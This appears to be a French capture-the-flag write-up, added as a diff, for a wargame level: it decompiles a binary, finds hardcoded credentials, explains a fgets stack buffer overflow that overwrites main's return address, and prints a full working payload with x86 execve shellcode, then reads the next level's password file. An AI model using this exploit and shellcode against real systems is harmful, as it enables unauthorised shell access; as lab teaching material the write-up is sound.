@@ -1,0 +1,33 @@
+On récupère le programme et on le décompile avec dogbolt. On voit que le
+pogramme prend en entrée un user_name et un mot de passe. Les valeurs sont en
+clair dans le code, "dat_wil" pour le nom d'utilisateur, et "admin" pour le mdp. 
+Si le user_name n'est pas bon, le programme ne demande pas le mdp à
+l'utilisateur. 
+
+La faille est le fait que le programme fait des fgets plus grand que les
+variables disponibles, ce qui permet un buffer overflow, et de réécrire
+d'adresse de retour du main. 
+
+Avec un outil en ligne, on trouve que l'adresse de retour de main est stockée
+80 octets après le début de la variable password, qui est une locale de main. 
+Pour utiliser la faille, il suffit de mettre 80 caractères de padding, et
+ensuite l'adresse d'un shellcode qu'on aura inséré. Il est pratique de
+mettre le shellcode dans la variable user_name, dont on trouve l'adresse avec
+gdb. On trouve que l'adresse de cette variable globale est 0x0804a040. 
+Il est possible de mettre le shellcode dans la variable user_name car le
+programme effectue un memcmp sur seulement les 5 premiers octets, et ignore les
+autres. 
+
+On construit la payload :
+- "dat_wil" car il faut que le user_name soit ce que le pogramme attent pour
+  avoir l'occasion de rentrer le mdp
+- une nop-slide
+- le shellcode
+- "\n" pour dire à scanf qu'on a finit d'écrire
+- "a" * 80 pour faire du padding
+- l'adresse de la variable user_name, en ordre little endian + 7 octets pour
+  passer après le user_name et dans la nop-slide
+
+python -c 'print("dat_wil" + "\x90\x90\x90\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x89\xe1\xb0\x0b\xcd\x80" + "\n" + "a" * 80 + "\x47\xa0\x04\x08\n")' > /tmp/test && cat /tmp/test - | ./level01
+
+cat ~level02/.pass
